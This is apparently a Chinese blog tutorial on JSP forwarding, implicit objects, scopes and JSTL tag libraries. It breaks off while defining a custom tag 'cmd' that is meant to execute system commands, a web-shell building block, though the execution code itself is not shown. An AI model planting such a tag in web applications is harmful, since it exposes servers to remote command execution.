<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231844978.png" alt="image-20220223184433857"></p>
<h5 id="forward">- forward -</h5>
<p>用以实现请求转发功能，类似 <code>request.getRequestDispatcher(&quot;page&quot;).forward(request,response)</code> ，简单来说即是将请求和响应内容原封不动地交给另一个页面进行处理，页面内容显示的是另一个页面的内容。</p>
<p>比如在 <code>a.jsp</code>👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;a&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;b.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;a&quot;</span> value=<span class="string">&quot;123&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在 <code>b.jsp</code>👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;b&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.println(request.getParameter(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    out.println(request.getParameter(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当以 <code>?b=321</code> 去访问 <code>a.jsp</code> 时👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231855923.png" alt="image-20220223185500826"></p>
<p>虽然访问的是 <code>a.jsp?b=321</code> 但显示出来的内容为 <code>b.jsp</code> 页面的内容，这意味着在 <code>b.jsp</code> 中可以使用 <code>a.jsp</code> 的 <code>request</code> 和 <code>response</code>。</p>
<h4 id="九大内置对象">- 九大内置对象 -</h4>
<p>由于在 <code>jsp</code> 中隐藏着九个内置对象，这使得 <code>jsp</code> 比 <code>serlvet</code> 用起来更为方便(摘自 <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-syntax.html">JSP语法</a> )👇</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>对象</strong></th>
<th style="text-align:left"><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">request</td>
<td style="text-align:left"><strong>HttpServletRequest</strong>类的实例</td>
</tr>
<tr>
<td style="text-align:left">response</td>
<td style="text-align:left"><strong>HttpServletResponse</strong>类的实例</td>
</tr>
<tr>
<td style="text-align:left">out</td>
<td style="text-align:left"><strong>PrintWriter</strong>类的实例，用于把结果输出至网页上</td>
</tr>
<tr>
<td style="text-align:left">session</td>
<td style="text-align:left"><strong>HttpSession</strong>类的实例</td>
</tr>
<tr>
<td style="text-align:left">application</td>
<td style="text-align:left"><strong>ServletContext</strong>类的实例，与应用上下文有关</td>
</tr>
<tr>
<td style="text-align:left">config</td>
<td style="text-align:left"><strong>ServletConfig</strong>类的实例</td>
</tr>
<tr>
<td style="text-align:left">pageContext</td>
<td style="text-align:left"><strong>PageContext</strong>类的实例，提供对JSP页面所有对象以及命名空间的访问</td>
</tr>
<tr>
<td style="text-align:left">page</td>
<td style="text-align:left">类似于Java类中的this关键字</td>
</tr>
<tr>
<td style="text-align:left">Exception</td>
<td style="text-align:left"><strong>Exception</strong>类的对象，代表发生错误的JSP页面中对应的异常对象</td>
</tr>
</tbody>
</table>
<h4 id="四大作用域">- 四大作用域 -</h4>
<p>其实就是九大内置对象中的四个，因为这四个对象都可以用 <code>setAttribute</code> 方法来存储数据，用 <code>getAttribute</code> 获取数据。</p>
<h5 id="application">- application -</h5>
<p>存在 <code>application</code> 的数据可以在服务器下的多个应用中访问。</p>
<h5 id="page-2">- page -</h5>
<p>存在 <code>page </code> 的数据只能在当前页面中访问。</p>
<h5 id="request">- request -</h5>
<p>存在 <code>request</code> 的数据可以在同一次请求中访问，如可以通过请求转发形式在 <code>b.jsp</code> 页面中访问 <code>a.jsp</code> 页面存在 <code>request</code> 的数据。</p>
<h5 id="session">- session -</h5>
<p>存在 <code>session</code> 的数据可以在同一会话中访问，一般来说可以在同一个项目下的所有页面访问到。</p>
<h4 id="标签-tag">- 标签(tag) -</h4>
<p>实话说，标签用起来感觉还挺方便。</p>
<h5 id="JSTL标签">- JSTL标签 -</h5>
<p>即 <code>jsp</code> 标准标签库，封装了 <code>jsp</code> 应用的通用核心功能。需要从 <a target="_blank" rel="noopener" href="http://archive.apache.org/dist/jakarta/taglibs/standard/binaries/">http://archive.apache.org/dist/jakarta/taglibs/standard/binaries/</a> 下载相应的版本，然后将里面 <code>lib</code> 目录的 <code>jar</code> ，<code>tld</code> 目录的 <code>tld</code> 文件放到对应路径中。</p>
<p>比如这里路径配置如下👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231928229.png" alt="image-20220223192855152"></p>
<p>然后是 <code>web.xml</code> 内容👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/core<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/c.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/fmt<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/fmt.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/sql<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/sql.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/xml<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/x.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">taglib</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-uri</span>&gt;</span>http://java.sun.com/jsp/jstl/functions<span class="tag">&lt;/<span class="name">taglib-uri</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">taglib-location</span>&gt;</span>/WEB-INF/tld/fn.tld<span class="tag">&lt;/<span class="name">taglib-location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据所提供的功能，可以分为 <code>5</code> 个类别👇</p>
<ul>
<li><code>核心标签</code></li>
<li><code>格式化标签</code></li>
<li><code>SQL标签</code></li>
<li><code>XML标签</code></li>
<li><code>JSTL函数</code></li>
</ul>
<p>其中各个标签定义如下(摘自<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jsp-jstl.html">jsp标准标签库</a>)👇</p>
<p><code>核心标签</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">标签</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-out-tag.html">&lt;c:out&gt;</a></td>
<td style="text-align:left">用于在JSP中显示数据，就像&lt;%= … &gt;</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-set-tag.html">&lt;c:set&gt;</a></td>
<td style="text-align:left">用于保存数据</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-remove-tag.html">&lt;c:remove&gt;</a></td>
<td style="text-align:left">用于删除数据</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-catch-tag.html">&lt;c:catch&gt;</a></td>
<td style="text-align:left">用来处理产生错误的异常状况，并且将错误信息储存起来</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-if-tag.html">&lt;c:if&gt;</a></td>
<td style="text-align:left">与我们在一般程序中用的if一样</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:choose&gt;</a></td>
<td style="text-align:left">本身只当做&lt;c:when&gt;和&lt;c:otherwise&gt;的父标签</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:when&gt;</a></td>
<td style="text-align:left">&lt;c:choose&gt;的子标签，用来判断条件是否成立</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-choose-tag.html">&lt;c:otherwise&gt;</a></td>
<td style="text-align:left">&lt;c:choose&gt;的子标签，接在&lt;c:when&gt;标签后，当&lt;c:when&gt;标签判断为false时被执行</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-import-tag.html">&lt;c:import&gt;</a></td>
<td style="text-align:left">检索一个绝对或相对 URL，然后将其内容暴露给页面</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-foreach-tag.html">&lt;c:forEach&gt;</a></td>
<td style="text-align:left">基础迭代标签，接受多种集合类型</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-foreach-tag.html">&lt;c:forTokens&gt;</a></td>
<td style="text-align:left">根据指定的分隔符来分隔内容并迭代输出</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-param-tag.html">&lt;c:param&gt;</a></td>
<td style="text-align:left">用来给包含或重定向的页面传递参数</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-redirect-tag.html">&lt;c:redirect&gt;</a></td>
<td style="text-align:left">重定向至一个新的URL.</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-core-url-tag.html">&lt;c:url&gt;</a></td>
<td style="text-align:left">使用可选的查询参数来创造一个URL</td>
</tr>
</tbody>
</table>
<p><code>格式化标签</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fmt&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/fmt&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">标签</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-formatnumber-tag.html"><a href="fmt:formatNumber">fmt:formatNumber</a></a></td>
<td style="text-align:left">使用指定的格式或精度格式化数字</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-parsenumber-tag.html"><a href="fmt:parseNumber">fmt:parseNumber</a></a></td>
<td style="text-align:left">解析一个代表着数字，货币或百分比的字符串</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-formatdate-tag.html"><a href="fmt:formatDate">fmt:formatDate</a></a></td>
<td style="text-align:left">使用指定的风格或模式格式化日期和时间</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-parsedate-tag.html"><a href="fmt:parseDate">fmt:parseDate</a></a></td>
<td style="text-align:left">解析一个代表着日期或时间的字符串</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-bundle-tag.html"><a href="fmt:bundle">fmt:bundle</a></a></td>
<td style="text-align:left">绑定资源</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-setlocale-tag.html"><a href="fmt:setLocale">fmt:setLocale</a></a></td>
<td style="text-align:left">指定地区</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-setbundle-tag.html"><a href="fmt:setBundle">fmt:setBundle</a></a></td>
<td style="text-align:left">绑定资源</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-timezone-tag.html"><a href="fmt:timeZone">fmt:timeZone</a></a></td>
<td style="text-align:left">指定时区</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-settimezone-tag.html"><a href="fmt:setTimeZone">fmt:setTimeZone</a></a></td>
<td style="text-align:left">指定时区</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-message-tag.html"><a href="fmt:message">fmt:message</a></a></td>
<td style="text-align:left">显示资源配置文件信息</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-format-requestencoding-tag.html"><a href="fmt:requestEncoding">fmt:requestEncoding</a></a></td>
<td style="text-align:left">设置request的字符编码</td>
</tr>
</tbody>
</table>
<p><code>SQL标签</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;sql&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/sql&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">标签</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-setdatasource-tag.html"><a href="sql:setDataSource">sql:setDataSource</a></a></td>
<td style="text-align:left">指定数据源</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-query-tag.html"><a href="sql:query">sql:query</a></a></td>
<td style="text-align:left">运行SQL查询语句</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-update-tag.html"><a href="sql:update">sql:update</a></a></td>
<td style="text-align:left">运行SQL更新语句</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-param-tag.html"><a href="sql:param">sql:param</a></a></td>
<td style="text-align:left">将SQL语句中的参数设为指定值</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-dateparam-tag.html"><a href="sql:dateParam">sql:dateParam</a></a></td>
<td style="text-align:left">将SQL语句中的日期参数设为指定的java.util.Date 对象值</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-sql-transaction-tag.html"><a href="sql:transaction">sql:transaction</a></a></td>
<td style="text-align:left">在共享数据库连接中提供嵌套的数据库行为元素，将所有语句以一个事务的形式来运行</td>
</tr>
</tbody>
</table>
<p><code>XML标签</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;x&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/xml&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">标签</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-out-tag.html">&lt;x:out&gt;</a></td>
<td style="text-align:left">与&lt;%= … &gt;,类似，不过只用于XPath表达式</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-parse-tag.html">&lt;x:parse&gt;</a></td>
<td style="text-align:left">解析 XML 数据</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-set-tag.html">&lt;x:set&gt;</a></td>
<td style="text-align:left">设置XPath表达式</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-if-tag.html">&lt;x:if&gt;</a></td>
<td style="text-align:left">判断XPath表达式，若为真，则执行本体中的内容，否则跳过本体</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-foreach-tag.html">&lt;x:forEach&gt;</a></td>
<td style="text-align:left">迭代XML文档中的节点</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:choose&gt;</a></td>
<td style="text-align:left">&lt;x:when&gt;和&lt;x:otherwise&gt;的父标签</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:when&gt;</a></td>
<td style="text-align:left">&lt;x:choose&gt;的子标签，用来进行条件判断</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-choose-tag.html">&lt;x:otherwise&gt;</a></td>
<td style="text-align:left">&lt;x:choose&gt;的子标签，当&lt;x:when&gt;判断为false时被执行</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-transform-tag.html">&lt;x:transform&gt;</a></td>
<td style="text-align:left">将XSL转换应用在XML文档中</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-xml-param-tag.html">&lt;x:param&gt;</a></td>
<td style="text-align:left">与&lt;x:transform&gt;共同使用，用于设置XSL样式表</td>
</tr>
</tbody>
</table>
<p><code>JSTL函数</code></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fn&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/functions&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-contains.html">fn:contains()</a></td>
<td style="text-align:left">测试输入的字符串是否包含指定的子串</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-containsignoreCase.html">fn:containsIgnoreCase()</a></td>
<td style="text-align:left">测试输入的字符串是否包含指定的子串，大小写不敏感</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-endswith.html">fn:endsWith()</a></td>
<td style="text-align:left">测试输入的字符串是否以指定的后缀结尾</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-escapexml.html">fn:escapeXml()</a></td>
<td style="text-align:left">跳过可以作为XML标记的字符</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-indexof.html">fn:indexOf()</a></td>
<td style="text-align:left">返回指定字符串在输入字符串中出现的位置</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-join.html">fn:join()</a></td>
<td style="text-align:left">将数组中的元素合成一个字符串然后输出</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-length.html">fn:length()</a></td>
<td style="text-align:left">返回字符串长度</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-replace.html">fn:replace()</a></td>
<td style="text-align:left">将输入字符串中指定的位置替换为指定的字符串然后返回</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-split.html">fn:split()</a></td>
<td style="text-align:left">将字符串用指定的分隔符分隔然后组成一个子字符串数组并返回</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-startswith.html">fn:startsWith()</a></td>
<td style="text-align:left">测试输入字符串是否以指定的前缀开始</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substring.html">fn:substring()</a></td>
<td style="text-align:left">返回字符串的子集</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substringafter.html">fn:substringAfter()</a></td>
<td style="text-align:left">返回字符串在指定子串之后的子集</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-substringbefore.html">fn:substringBefore()</a></td>
<td style="text-align:left">返回字符串在指定子串之前的子集</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-tolowercase.html">fn:toLowerCase()</a></td>
<td style="text-align:left">将字符串中的字符转为小写</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-touppercase.html">fn:toUpperCase()</a></td>
<td style="text-align:left">将字符串中的字符转为大写</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/jsp/jstl-function-trim.html">fn:trim()</a></td>
<td style="text-align:left">移除首位的空白符</td>
</tr>
</tbody>
</table>
<h5 id="自定义标签">- 自定义标签 -</h5>
<p>比方说自定义一个可用来执行系统命令的标签 <code>cmd</code> ，先写一个实现的类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.JspException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.tagext.SimpleTagSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmd</span> <span class="keyword">extends</span> <span class="title">SimpleTagSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cmd = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> show = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setShow</span><span class="params">(<span class="keyword">boolean</span> show)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.show = show;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    